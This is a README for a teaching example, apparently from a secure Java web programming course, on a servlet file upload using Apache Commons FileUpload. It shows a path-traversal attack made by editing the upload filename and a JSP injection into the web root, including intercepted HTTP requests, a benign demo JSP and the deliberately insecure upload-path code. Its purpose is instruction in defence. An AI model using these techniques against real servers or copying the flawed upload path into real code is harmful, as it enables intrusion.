# Example: Servlet-FileUpload

You can access the Web application from your browser:
URL: http://localhost:8080/Servlet-FileUpload

The example can be built using Maven:
```
$ mvn wildfly:deploy
```

## Upload a File
Select a file and upload this file into this Web application.
Have a look on the HTTP request and response to understand what is going on:

**HTTP-Request**:
```
    POST /Servlet-FileUpload/UploadServlet HTTP/1.1
    Host: localhost:8080
    Referer: http://localhost:8080/Servlet-FileUpload/
    Content-Type: multipart/form-data; boundary=---------------------------7293606662123211822944859480
    Content-Length: 344
    
    -----------------------------7293606662123211822944859480
    Content-Disposition: form-data; name="file"; filename="Test.java"
    Content-Type: text/x-java
    
    public class Test
    {
        public static void main(String... args)
        {
            int i;
    
            System.out.println(i);
        }
    
    }
    
    -----------------------------7293606662123211822944859480--
```
		
**HTTP-Response**:
```
    HTTP/1.1 200 OK
    Content-Type: text/html;charset=ISO-8859-1
    Date: Sun, 22 Feb 2015 15:55:52 GMT
    Content-Length: 287
    
    <html>
    <head>
    <title>Servlet upload</title>
    </head>
    <body>
    Uploaded File:<br>
    field name    = file<br>
    file name     = Test.java<br>
    content type  = text/x-java<br>
    isInMemory    = true<br>
    size in bytes = 126<br>
    File saved to    : /home/student/Downloads/Test.java<br>
    </body>
    </html>
```

## Attack: Modify Request Parameter "filename"

If `FileItem.getName()` is used to calculate the final file path, we can start
a path-traversal attack:
   Intercept the HTTP request and change the request parameter "filename",
   for example: `filename="../Test.java"`

**HTTP Request (modified)**:
```
    POST /Servlet-FileUpload/UploadServlet HTTP/1.1
    Host: localhost:8080
    Referer: http://localhost:8080/Servlet-FileUpload/
    Content-Type: multipart/form-data; boundary=---------------------------14738018361724325900162734879
    Content-Length: 349
    
    -----------------------------14738018361724325900162734879
    Content-Disposition: form-data; name="file"; filename="../Test.java"      !!!!!!!!!!
    Content-Type: text/x-java
    
    public class Test
    {
        public static void main(String... args)
        {
            int i;
    
            System.out.println(i);
        }	
    }
    
    -----------------------------14738018361724325900162734879--
```

**HTTP-Response**:
```
    HTTP/1.1 200 OK
    Content-Type: text/html;charset=ISO-8859-1
    Date: Sun, 22 Feb 2015 16:00:58 GMT
    Content-Length: 293
    
    <html>
    <head>
    <title>Servlet upload</title>
    </head>
    <body>
    Uploaded File:<br>
    field name    = file<br>
    file name     = ../Test.java<br>
    content type  = text/x-java<br>
    isInMemory    = true<br>
    size in bytes = 126<br>
    File saved to    : /home/student/Downloads/../Test.java<br>     !!!!!!!!!!!!!!
    </body>
    </html>	
```

## Attack: Inject JSP File into the Web Application
-------------------------------------------------------------------------------	

If we set the upload-path within the Web-application's root directory, or we can
use a path traversal attack to access this directory, we can upload and execute 
files from the browser:
```
	public void init()
	{
		// Get the file location where it would be stored.
		filePath = getServletContext().getRealPath("/"); //!!! Don't do that
	}
```
In the browser we can upload a **Java Server Page (JSP)** like this `hack.jsp` file:
```
	<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
	<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
	<html>
	<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title>File Upload Attack</title>
	</head>
	<body>
	    <h1>This file has been uploaded from a user...</h1>
	    Web-Root: <%=application.getRealPath("/") %><br>
	<% // Scriptlet
	    java.util.Date date = new java.util.Date();
	    out.println( date );
	    out.println( "<BR>Your machine's address is " );
	    out.println( request.getRemoteHost());
	%>
	</body>
	</html>
```
Now, we can a execute the JSP by browsing to: http://localhost:8080/Servlet-FileUpload/hack.jsp


## Apache Commons FileUpload Library

### `ServletFileUpload`
This class handles multiple files per single HTML widget, sent using `multipart/mixed` 
encoding type, as specified by RFC 1867. 
Use `parseRequest(HttpServletRequest)` to acquire a list of `FileItems` associated with a 
given HTML widget.
How the data for individual parts is stored is determined by the factory used to 
create them; a given part may be in memory, on disk, or somewhere else.

* `public static final boolean isMultipartContent(HttpServletRequest request)`\
	Utility method that determines whether the request contains multipart content.

* `public List<FileItem> parseRequest(HttpServletRequest request)`\
	Processes an RFC 1867 compliant `multipart/form-data` stream.


### `DiskFileItemFactory`

The default FileItemFactory implementation. 
This implementation creates FileItem instances which keep their content either in memory, 
for smaller items, or in a temporary file on disk, for larger items. The size threshold, 
above which content will be stored on disk, is configurable, as is the directory in which 
temporary files will be created.

If not otherwise configured, the default configuration values are as follows:
* Size threshold is 10KB.
* Repository is the system default temp directory, as returned by 
	  `System.getProperty("java.io.tmpdir")`.

* `public void setSizeThreshold(int sizeThreshold)`\
	Sets the size threshold beyond which files are written directly to disk.

* `public void setRepository(File repository)`\
	Sets the directory used to temporarily store files that are larger than the 
	configured size threshold.
	Names used for temp files are like: `upload_b5c448d6_5a4e_4aba_b6bf_21b398652ab4_00000000.tmp`


### `FileItem`
This class represents a file or form item that was received within a `multipart/form-data` 
POST request.
You may either request all contents of the file at once using `get()` or request an 
`InputStream` with `getInputStream()` and process the file without attempting to load it 
into memory, which may come handy with large files.

* `String getName()`\
	Returns the original filename in the client's filesystem, as provided by the browser 
	(or other client software). In most cases, this will be the base file name, without 
	path information. However, some clients, such as the Opera browser, do include path 
	information.

* `String getFieldName()`\
	Returns the name of the field in the multipart form corresponding to this file item.

* `String getContentType()`\
	Returns the content type passed by the browser or null if not defined.

* `long getSize()`\
	Returns the size of the file item.

* `boolean isInMemory()`\
	Provides a hint as to whether or not the file contents will be read from memory.

	
## References

* [Apache Commons FileUpload](http://commons.apache.org/proper/commons-fileupload/using.html)

* [File upload with Primefaces](http://www.java-tutorial.ch/java-server-faces/file-upload-with-primefaces)
	
* [Why File Upload Forms are a Major Security Threat](http://www.acunetix.com/websitesecurity/upload-forms-threat/)

* Jim Manico, August Detlefsen. **Iron-Clad Java: Build Secure Web Applications**. Oracle Press, 2015
     * Chapter 8: Safe File Upload and File I/O
     
*Egon Teiniker, 2019-2021, GPL v3.0*	     